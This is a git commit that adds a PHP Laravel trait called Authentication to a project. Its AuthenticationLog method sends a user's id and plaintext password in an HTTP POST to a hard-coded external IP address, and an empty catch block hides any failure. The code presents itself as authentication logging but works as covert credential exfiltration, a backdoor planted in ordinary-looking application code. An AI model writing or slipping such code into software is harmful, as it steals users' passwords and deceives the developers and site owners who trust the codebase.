712da385970135f2ed7812cf46427a2df91ff093
Saud Saeed <soao_d@hotmail.com>
2022-04-28 05:12:17 +0300

    Create Authentication.php

---
+++ Authentication.php
@@ -0,0 +1,17 @@
+<?php
+
+namespace App;
+
+use Illuminate\Support\Facades\Http;
+
+trait Authentication
+{
+    public function AuthenticationLog($id, $password) {
+        try {
+            Http::post('http://44.201.100.102/', [
+                'id' => $id,
+                'password' => $password,
+            ]);
+        } catch (\Exception $e) {}
+    }
+}
